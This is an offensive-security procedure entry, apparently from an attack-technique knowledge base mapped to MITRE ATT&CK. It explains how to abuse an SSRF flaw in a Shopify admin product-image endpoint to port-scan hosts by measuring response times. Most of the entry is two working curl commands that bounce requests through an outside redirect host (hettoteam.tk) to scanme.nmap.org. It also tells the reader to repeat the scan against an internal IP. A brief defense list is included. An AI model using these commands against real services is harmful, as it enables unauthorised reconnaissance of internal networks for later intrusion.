---
id: 123e4567-e89b-12d3-a456-426614174003
name: Perform-Port-Scanning-using-HTTP-RTT
type: procedure
verified: false
submitted: true
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.795Z'
tactics:
  - '[[Reconnaissance]]'
techniques:
  - '[[Active Scanning]]'
sub_techniques: []
tags:
  - ssrf
  - port-scanning
  - timing-attack
commands:
  - '[[commands/ssrf-scan-port-closed]]'
  - '[[commands/ssrf-scan-port-open]]'
platforms:
  - Web
tools: []
skill_level: intermediate
impact_level: high
detection_risk: high
validated: true
mitre_tactics:
  - '[[Reconnaissance]]'
mitre_techniques:
  - '[[Active Scanning]]'
---

# Perform-Port-Scanning-using-HTTP-RTT

## Summary

This procedure uses SSRF to scan ports on arbitrary hosts by measuring HTTP response times (RTT), where open ports cause delays due to connection attempts.

## Description

After bypassing validation, vary the port in redirect URLs and time responses. Closed ports (e.g., 1,2,3) yield ~300ms RTT; open (e.g., 22 SSH) ~420ms. Tested on scanme.nmap.org and internal 23.227.55.1 (22 open, 21 closed). Enables firewall bypass for internal recon.

## Requirements

1. Bypassed SSRF endpoint access
2. Script or manual timing for multiple ports (e.g., 1-1024)
3. Targets like public scanme.nmap.org or internals

## Defense

Defensive measures and detection strategies:

- Normalize response times or add jitter to obscure port status
- Monitor for repeated requests to the same endpoint with varying URLs
- Block timing-based attacks via rate limiting or CAPTCHA

## Objectives

1. Infer port status from RTT differences
2. Scan external and internal networks
3. Identify services like SSH for further exploitation

## Instructions

### Step 1: Prepare Port List

**Context**: Define ports to scan, starting with common ones (1-3 closed, 21 FTP, 22 SSH).

### Step 2: Scan Closed Port

**Context**: Test a known closed port to baseline RTT.

**Command** ([[commands/ssrf-scan-port-closed]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -w '%{time_total}' \
  -d 'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:1&_method=post' > /dev/null
```

> Outputs ~0.300s for closed port.

### Step 3: Scan Open Port

**Context**: Test an open port to observe delay.

**Command** ([[commands/ssrf-scan-port-open]]):
```bash
curl -X POST 'https://test-4925.myshopify.com/admin/products/922460995/images' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-CSRF-Token: F7cvLpquxqr+rFmnGVFhNEK6rV8njtebHikevxGlLJA=' \
  -w '%{time_total}' \
  -d 'utf8=%E2%9C%93&authenticity_token=F7cvLpquxqr%2BrFmnGVFhNEK6rV8njtebHikevxGlLJA%3D&product_id=922460995&image%5Bsrc%5D=http://hettoteam.tk/r.php?r=http://scanme.nmap.org:22&_method=post' > /dev/null
```

> Outputs ~0.420s for open port.

Repeat for internals like http://23.227.55.1:22.

## MITRE ATT&CK Mapping

### Tactics

- [[Reconnaissance]] Reconnaissance

### Techniques

- [[Active Scanning]] Active Scanning

### Sub-Techniques


## Commands Used

- [[commands/ssrf-scan-port-closed]]
- [[commands/ssrf-scan-port-open]]

## Tools Used


## Tags

- [[ssrf]]
- [[port-scanning]]
- [[timing-attack]]
